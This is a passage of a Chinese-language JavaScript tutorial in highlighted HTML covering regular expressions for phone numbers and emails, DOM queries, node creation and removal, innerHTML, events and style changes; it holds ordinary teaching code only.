class="string">&quot;bbca&quot;</span>)) <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个正则表达式，用来检查一个字符串是否是一个合法手机号</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 手机号的规则：</span></span><br><span class="line"><span class="comment"> * 1 3 567890123 （11位）</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 1. 以1开头</span></span><br><span class="line"><span class="comment"> * 2. 第二位3-9任意数字</span></span><br><span class="line"><span class="comment"> * 3. 三位以后任意数字9个</span></span><br><span class="line"><span class="comment"> * ^1   [3-9]  [0-9]&#123;9&#125;$</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> phoneReg = <span class="regexp">/^1[3-9][0-9]&#123;9&#125;$/</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>检查一个字符串中是否含有 .</p><ul><li>. 表示任意字符</li><li>在正则表达式中使用\作为转义字符<ul><li>\. 表示.</li><li>\\  表示<br>使用<code>构造函数</code>时，由于它的参数是一个字符串，而\是字符串中转义字符，使用\则需要使用\\来代替<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/\./</span>;</span><br><span class="line">reg = <span class="regexp">/\\/</span>;</span><br><span class="line">reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;\\.&quot;</span>);</span><br><span class="line">reg = <span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&quot;\\\\&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>\w</p><ul><li>任意字母、数字、_  [A-z0-9_]</li></ul></li><li><p>\W</p><ul><li>除了字母、数字、_  [^A-z0-9_]</li></ul></li><li><p>\d</p><ul><li>任意的数字 [0-9]</li></ul></li><li><p>\D</p><ul><li>除了数字 [^0-9]</li></ul></li><li><p>\s</p><ul><li>空格</li></ul></li><li><p>\S</p><ul><li>除了空格</li></ul></li><li><p>\b</p><ul><li>单词边界</li></ul></li><li><p>\B</p><ul><li>除了单词边界<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个正则表达式检查一个字符串中是否含有单词child</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/\bchild\b/</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&quot;hello child &quot;</span>)); <span class="comment">// true</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">test</span>(<span class="string">&quot;hellochild &quot;</span>)); <span class="comment">// false</span></span><br><span class="line"><span class="comment">// /^\s*|\s*$/g 匹配开头和结尾的空格</span></span><br><span class="line"><span class="keyword">var</span> str = str.<span class="title function_">replace</span>(<span class="regexp">/^\s*|\s*$/g</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="邮箱正则"><a href="#邮箱正则" class="headerlink" title="邮箱正则"></a>邮箱正则</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 电子邮箱</span></span><br><span class="line"><span class="comment"> * hello  .nihao          @     abc  .com.cn</span></span><br><span class="line"><span class="comment"> * 任意字母数字下划线    .任意字母数字下划线  @   任意字母数字     .任意字母（2-5位）   .任意字母（1-2位）</span></span><br><span class="line"><span class="comment"> * \w&#123;3,&#125;               (\.\w+)*         @    [A-z0-9]+      (\.[A-z]&#123;2, 5&#125;)&#123;1, 2&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> emailReg = <span class="regexp">/^\w&#123;3,&#125;(\.\w+)*@[A-z0-9]+(\.[A-z]&#123;2,5&#125;)&#123;1,2&#125;$/</span>;</span><br><span class="line"><span class="keyword">var</span> email = <span class="string">&quot;abc.hello@163.com&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(emailReg.<span class="title function_">test</span>(email)); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><hr><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1><h2 id="document"><a href="#document" class="headerlink" title="document"></a>document</h2><ul><li>浏览器已经为我们提供 文档节点，这个对象是window属性</li><li>可以在页面中直接使用，文档节点代表的是整个网页<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>);</span><br><span class="line"><span class="comment">//获取到button对象</span></span><br><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>);</span><br><span class="line"><span class="comment">//修改按钮的文字</span></span><br><span class="line">btn.<span class="property">innerHTML</span> = <span class="string">&quot;I&#x27;m Button&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><ul><li>用户和浏览器之间的交互行为，比如：点击按钮，鼠标移动、关闭窗口…<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  我们可以在事件对应的属性中设置一些js代码，</span></span><br><span class="line"><span class="comment">  这样当事件被触发时，这些代码将会执行</span></span><br><span class="line"><span class="comment">  这种写法我们称为结构和行为耦合，不方便维护，不推荐使用</span></span><br><span class="line"><span class="comment">  &lt;button id=&quot;btn1&quot; onmousemove=&quot;alert(&#x27;讨厌，你点我干嘛！&#x27;);&quot;&gt;我是一个按钮&lt;/button&gt;</span></span><br><span class="line"><span class="comment">  --&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>我是一个按钮<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//获取按钮对象</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 可以为按钮的对应事件绑定处理函数的形式来响应事件</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 这样当事件被触发时，其对应的函数将会被调用</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//绑定一个单击事件</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//像这种为单击事件绑定的函数，我们称为单击响应函数</span></span></span><br><span class="line"><span class="language-javascript">    btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">alert</span>(<span class="string">&quot;你还点~~~&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="文档加载"><a href="#文档加载" class="headerlink" title="文档加载"></a>文档加载</h2><ul><li>浏览器在加载一个页面时，是按照自上向下的顺序加载的<ul><li>读取到一行就运行一行,如果将script标签写到页面的上边，</li><li>在代码执行时，页面还没有加载，页面DOM对象也没有加载，</li><li>会导致无法获取到DOM对象</li></ul></li><li>onload事件会在整个页面加载完成之后才触发，为window绑定一个onload事件<ul><li>该事件对应的响应函数将会在页面加载完成之后执行，</li><li>这样可以确保我们的代码执行时所有的DOM对象已经加载完毕了<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">  // 第一种</span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//获取id为btn的按钮</span></span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//为按钮绑定一个单击响应函数</span></span></span><br><span class="line"><span class="language-javascript">      btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>点我一下<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// 第二种</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/**</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     * 将js代码编写到页面的下部就是为了可以在页面加载完毕以后再执行js代码</span></span></span><br><span class="line"><span class="comment"><span class="language-javascript">     */</span></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//获取id为btn的按钮</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//为按钮绑定一个单击响应函数</span></span></span><br><span class="line"><span class="language-javascript">    btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="dom查询"><a href="#dom查询" class="headerlink" title="dom查询"></a>dom查询</h2><ul><li>innerHTML 通过这个属性可以获取到元素内部的html代码，对于自结束标签，这个属性没有意义</li><li>innerText 该属性可以获取到元素内部的文本内容, 它和innerHTML类似，不同的是它会自动将html去除</li><li>getElementById()可以根据id来获取元素节点对象</li><li>getElementsByTagName()可以根据标签名来获取一组元素节点对象<ul><li>这个方法会给我们返回一个类数组对象，所有查询到的元素都会封装到对象中</li><li>即使查询到的元素只有一个，也会封装到数组中返回<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> lis = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;li&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li>getElementsByName()查找指定name的所有节点<ul><li>需要读取元素节点属性，直接使用 元素.属性名<ul><li>例子：元素.id 元素.name 元素.value</li><li>注意：class属性不能采用这种方式，读取class属性时需要使用 元素.className<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> inputs = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> um = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line"><span class="comment">//读取um的value属性值，文本框的value属性值，就是文本框中填写的内容</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(um.<span class="property">value</span>);</span><br><span class="line"><span class="comment">// 设置#username的value属性值</span></span><br><span class="line">um.<span class="property">value</span> = <span class="string">&quot;今天天气真不错~~~&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li>childNodes属性会获取包括文本节点在内的所有节点<ul><li>根据DOM标签标签间空白也会当成文本节点</li><li>注意：在IE8及以下的浏览器中，不会将空白文本当成子节点，所以该属性在IE8中会返回4个子元素而其他浏览器是9个<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"><span class="comment">//返回#city的所有子节点</span></span><br><span class="line"><span class="keyword">var</span> cns = city.<span class="property">childNodes</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li>firstChild可以获取到当前元素的第一个子节点（包括空白文本节点）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> phone = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;phone&quot;</span>);</span><br><span class="line"><span class="comment">//返回#phone的第一个子节点</span></span><br><span class="line"><span class="comment">//phone.childNodes[0];</span></span><br><span class="line"><span class="keyword">var</span> fir = phone.<span class="property">firstChild</span>;</span><br></pre></td></tr></table></figure></li><li>parentNode获取父节点<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bj = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bj&quot;</span>);</span><br><span class="line"><span class="comment">//返回#bj的父节点</span></span><br><span class="line"><span class="keyword">var</span> pn = bj.<span class="property">parentNode</span>;</span><br></pre></td></tr></table></figure></li><li>previousSibling前一个兄弟节点（也可能获取到空白的文本）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> and = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;android&quot;</span>);</span><br><span class="line"><span class="comment">//返回#android的前一个兄弟节点（也可能获取到空白的文本）</span></span><br><span class="line"><span class="keyword">var</span> ps = and.<span class="property">previousSibling</span>;</span><br></pre></td></tr></table></figure></li><li>在document中有一个属性body，它保存的是body的引用<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> body = <span class="variable language_">document</span>.<span class="property">body</span>;</span><br><span class="line"><span class="comment">//获取body标签</span></span><br><span class="line"><span class="comment">//var body1 = document.getElementsByTagName(&quot;body&quot;)[0];</span></span><br></pre></td></tr></table></figure></li><li>document.documentElement保存的是html根标签<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = <span class="variable language_">document</span>.<span class="property">documentElement</span>;</span><br></pre></td></tr></table></figure></li><li>document.all代表页面中所有的元素或document.getElementsByTagName(“*”)<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> all = <span class="variable language_">document</span>.<span class="property">all</span>;</span><br><span class="line">all = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;*&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>getElementsByClassName()可以根据class属性值获取一组元素节点对象，但是该方法不支持IE8及以下的浏览器<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementsByClassName</span>(<span class="string">&quot;box1&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>document.querySelector()<ul><li>需要一个选择器的字符串作为参数，可以根据一个CSS选择器来查询一个元素节点对象</li><li>虽然IE8中没有getElementsByClassName()但是可以使用querySelector()代替</li><li>使用该方法总会返回唯一的一个元素，如果满足条件的元素有多个，那么它只会返回第一个<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.box1 div&quot;</span>);</span><br><span class="line"><span class="comment">// 通过 Id 选择器选取元素</span></span><br><span class="line"><span class="keyword">var</span> element1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;#myDiv&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element1); <span class="comment">// 输出：&lt;div id=&quot;myDiv&quot;&gt;...&lt;/div&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过类选择器选取元素</span></span><br><span class="line"><span class="keyword">var</span> element2 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.selected&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element2); <span class="comment">// 输出：&lt;p class=&quot;selected&quot;&gt;Hello World!&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过标签选择器选取元素</span></span><br><span class="line"><span class="keyword">var</span> element3 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element3); <span class="comment">// 输出：&lt;p class=&quot;selected&quot;&gt;Hello World!&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 当没有匹配的元素时返回 null</span></span><br><span class="line"><span class="keyword">var</span> element4 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;.nonexistent&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(element4); <span class="comment">// 输出：null</span></span><br></pre></td></tr></table></figure></li></ul></li><li>document.querySelectorAll()<ul><li>该方法和querySelector()用法类似，不同的是它会将符合条件的元素封装到一个数组中返回</li><li>即使符合条件的元素只有一个，它也会返回数组<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> box = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;#box&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> elements = <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&quot;.selected&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(elements); <span class="comment">// 输出：NodeList [ &lt;p class=&quot;selected&quot;&gt;Hello World!&lt;/p&gt; ]</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="dom增删改"><a href="#dom增删改" class="headerlink" title="dom增删改"></a>dom增删改</h2><h3 id="dom增"><a href="#dom增" class="headerlink" title="dom增"></a>dom增</h3><ul><li><p>document.createElement()</p><ul><li>可以用于创建一个元素节点对象，</li><li>它需要一个标签名作为参数，将会根据该标签名创建元素节点对象，</li><li>并将创建好的对象作为返回值返回<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建li元素节点</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>document.createTextNode()</p><ul><li>可以用来创建一个文本节点对象</li><li>需要一个文本内容作为参数，将会根据该内容创建文本节点，并将新的节点返回<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建广州文本节点</span></span><br><span class="line"><span class="keyword">var</span> gzText = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;广州&quot;</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>appendChild()</p><ul><li>向一个父节点中添加一个新的子节点</li><li>用法：父节点.appendChild(子节点);<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建广州节点 &lt;li&gt;广州&lt;/li&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将gzText设置li的子节点</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> gzText = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;广州&quot;</span>);</span><br><span class="line">li.<span class="title function_">appendChild</span>(gzText);</span><br><span class="line"><span class="comment">//获取id为city的节点</span></span><br><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//将广州添加到city下</span></span><br><span class="line">city.<span class="title function_">appendChild</span>(li);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="dom插入"><a href="#dom插入" class="headerlink" title="dom插入"></a>dom插入</h3><ul><li>insertBefore()<ul><li>可以在指定的子节点前插入新的子节点</li><li>语法：父节点.insertBefore(新节点,旧节点);<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将&quot;广州&quot;节点插入到#bj前面</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个广州</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> gzText = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;广州&quot;</span>);</span><br><span class="line">li.<span class="title function_">appendChild</span>(gzText);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取id为bj的节点</span></span><br><span class="line"><span class="keyword">var</span> bj = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bj&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取city</span></span><br><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * insertBefore()</span></span><br><span class="line"><span class="comment"> * - 可以在指定的子节点前插入新的子节点</span></span><br><span class="line"><span class="comment"> *  - 语法：</span></span><br><span class="line"><span class="comment"> * 父节点.insertBefore(新节点,旧节点);</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">city.<span class="title function_">insertBefore</span>(li , bj);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="dom修改"><a href="#dom修改" class="headerlink" title="dom修改"></a>dom修改</h3><ul><li>replaceChild()<ul><li>可以使用指定的子节点替换已有的子节点</li><li>语法：父节点.replaceChild(新节点,旧节点);<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用&quot;广州&quot;节点替换#bj节点</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建一个广州</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> gzText = <span class="variable language_">document</span>.<span class="title function_">createTextNode</span>(<span class="string">&quot;广州&quot;</span>);</span><br><span class="line">li.<span class="title function_">appendChild</span>(gzText);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取id为bj的节点</span></span><br><span class="line"><span class="keyword">var</span> bj = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bj&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取city</span></span><br><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line">city.<span class="title function_">replaceChild</span>(li , bj);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="dom删除"><a href="#dom删除" class="headerlink" title="dom删除"></a>dom删除</h3><ul><li>removeChild()<ul><li>可以删除一个子节点</li><li>语法：父节点.removeChild(子节点) 或 子节点.parentNode.removeChild(子节点);<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取id为bj的节点</span></span><br><span class="line"><span class="keyword">var</span> bj = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bj&quot;</span>);</span><br><span class="line"><span class="comment">//获取city</span></span><br><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"></span><br><span class="line">city.<span class="title function_">removeChild</span>(bj) </span><br><span class="line"></span><br><span class="line"><span class="comment">// 或 bj.parentNode.removeChild(bj);</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="HTML代码"><a href="#HTML代码" class="headerlink" title="HTML代码"></a>HTML代码</h3><ul><li><p>读取HTML代码</p><ul><li>节点.innerHTML<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取#city内的HTML代码</span></span><br><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"><span class="title function_">alert</span>(city.<span class="property">innerHTML</span>);</span><br></pre></td></tr></table></figure></li></ul></li><li><p>设置HTML代码</p><ul><li>节点.innerHTML = 设置内容<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//设置#bj内的HTML代码</span></span><br><span class="line"><span class="keyword">var</span> bj = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bj&quot;</span>);</span><br><span class="line">bj.<span class="property">innerHTML</span> = <span class="string">&quot;昌平&quot;</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>使用innerHTML也可以完成DOM的增删改的相关操作，一般两种方式结合使用</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//向city中添加广州</span></span><br><span class="line"><span class="keyword">var</span> city = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;city&quot;</span>);</span><br><span class="line"><span class="comment">//创建一个li</span></span><br><span class="line"><span class="keyword">var</span> li = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;li&quot;</span>);</span><br><span class="line"><span class="comment">//向li中设置文本</span></span><br><span class="line">li.<span class="property">innerHTML</span> = <span class="string">&quot;广州&quot;</span>;</span><br><span class="line"><span class="comment">//将li添加到city中</span></span><br><span class="line">city.<span class="title function_">appendChild</span>(li);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 或 city.innerHTML += &quot;&lt;li&gt;广州&lt;/li&gt;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="额外知识"><a href="#额外知识" class="headerlink" title="额外知识"></a>额外知识</h3></li><li><p>confirm()用于弹出一个带有确认和取消按钮的提示框</p><ul><li>需要一个字符串作为参数，该字符串将会作为提示文字显示出来</li><li>如果用户点击确认则会返回true，如果点击取消则返回false<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//删除之前弹出一个提示框</span></span><br><span class="line"><span class="keyword">var</span> flag = <span class="title function_">confirm</span>(<span class="string">&quot;确认删除&quot;</span>+name+<span class="string">&quot;吗?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果用户点击确认</span></span><br><span class="line"><span class="keyword">if</span>(flag)&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="DOM操作CSS"><a href="#DOM操作CSS" class="headerlink" title="DOM操作CSS"></a>DOM操作CSS</h2><h3 id="修改元素样式"><a href="#修改元素样式" class="headerlink" title="修改元素样式"></a>修改元素样式</h3><ul><li><p>通过JS修改元素的样式</p><ul><li>语法：元素.style.样式名 = 样式值</li><li>注意：如果CSS的样式名中含有-，这种名称在JS中是不合法的比如background-color，需要将这种样式名修改为驼峰命名法，去掉-，然后将-后的字母大写</li><li>通过style属性设置的样式都是内联样式，而内联样式有较高的优先级，所以通过JS修改的样式往往会立即显示</li><li>如果在样式中写了!important，则此时样式会有最高的优先级，即使通过JS也不能覆盖该样式，此时将会导致JS修改样式失效，所以尽量不要为样式添加!important<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 点击按钮以后，修改box1的大小</span></span><br><span class="line"><span class="keyword">var</span> box1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;box1&quot;</span>);</span><br><span class="line"><span class="comment">//为按钮绑定单击响应函数</span></span><br><span class="line"><span class="keyword">var</span> btn01 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;btn01&quot;</span>);</span><br><span class="line">btn01.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  box1.<span class="property">style</span>.<span class="property">width</span> = <span class="string">&quot;300px&quot;</span>;</span><br><span class="line">  box1.<span class="property">style</span>.<span class="property">height</span> = <span class="string">&quot;300px&quot;</span>;</span><br><span class="line">  box1.<span class="property">style</span>.<span class="property">backgroundColor</span> = <span class="string">&quot;yellow&quot;</span>;</span><br><span 